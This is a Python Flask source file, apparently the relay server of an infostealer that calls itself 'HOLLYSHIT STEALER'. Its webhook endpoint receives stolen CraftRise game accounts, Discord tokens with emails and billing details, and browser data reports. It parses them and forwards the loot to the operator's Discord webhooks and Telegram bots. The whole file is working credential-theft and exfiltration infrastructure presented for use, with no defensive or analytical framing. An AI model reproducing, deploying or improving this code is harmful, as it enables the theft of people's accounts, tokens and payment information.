from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

def send_discord(url, data):
    if not url:
        return
    try:
        if isinstance(data, str):
            requests.post(url, json={"content": data}, timeout=30)
        else:
            requests.post(url, json=data, timeout=30)
    except Exception as e:
        print(f"Discord hatası: {e}")

def send_telegram(token, chat_id, msg):
    if token and chat_id and msg:
        try:
            if len(msg) > 4000:
                msg = msg[:4000] + "..."
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except Exception as e:
            print(f"Telegram hatası: {e}")

def extract_craftrise_account(content):
    """CraftRise hesabını content'ten çıkar"""
    match = re.search(r'`([^`]+)`', content)
    if match:
        return match.group(1)
    return content

def extract_discord_info(content):
    """Discord token bilgilerini content'ten çıkar"""
    user_match = re.search(r'\*\*User:\*\* `([^`]+)`', content)
    token_match = re.search(r'\*\*Token:\*\* `([^`]+)`', content)
    email_match = re.search(r'\*\*Email:\*\* `([^`]+)`', content)
    billing_match = re.search(r'\*\*Billing:\*\* `([^`]+)`', content)
    return {
        "user": user_match.group(1) if user_match else "Unknown",
        "token": token_match.group(1) if token_match else "Unknown",
        "email": email_match.group(1) if email_match else "Unknown",
        "billing": billing_match.group(1) if billing_match else "None"
    }

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        log_type = data.get("type", "unknown")
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            payload = data.get("data", data)
            send_discord(CRAFTRISE_WEBHOOK, payload)
            
            content = payload.get("content", "")
            account = extract_craftrise_account(content)
            tg_msg = f"🎮 **CraftRise Hesabı!**\n```\n{account}\n```"
            send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            payload = data.get("data", data)
            send_discord(DISCORD_WEBHOOK, payload)
            
            content = payload.get("content", "")
            info = extract_discord_info(content)
            tg_msg = f"💎 **Discord Token!**\n\n👤 **User:** {info['user']}\n🔑 **Token:** `{info['token'][:40]}...`\n📧 **Email:** {info['email']}"
            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ BROWSER / MASTER (3 EMBED'Lİ TEK MESAJ) ============
        else:
            payload = data.get("data", data)
            
            # Discord'a gönder (master webhook)
            send_discord(MASTER_WEBHOOK, payload)
            
            # Telegram için düz metin oluştur
            tg_msg = "🕸️ **HOLLYSHIT STEALER - FULL REPORT**\n\n"
            
            # Content'ten kullanıcı bilgisi
            content = payload.get("content", "")
            if content:
                tg_msg += f"{content}\n\n"
            
            # Embedlerden bilgileri çek
            embeds = payload.get("embeds", [])
            for embed in embeds:
                title = embed.get("title", "")
                if title:
                    tg_msg += f"**{title}**\n"
                
                fields = embed.get("fields", [])
                for field in fields:
                    name = field.get("name", "")
                    value = field.get("value", "")
                    # HTML taglerini ve emoji kodlarını temizle
                    value = re.sub(r'<[^>]+>', '', value)
                    value = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', value)
                    tg_msg += f"• {name}: {value}\n"
                tg_msg += "\n"
            
            # URL varsa ekle
            if payload.get("url"):
                tg_msg += f"📥 **Download:** {payload['url']}\n"
            
            send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
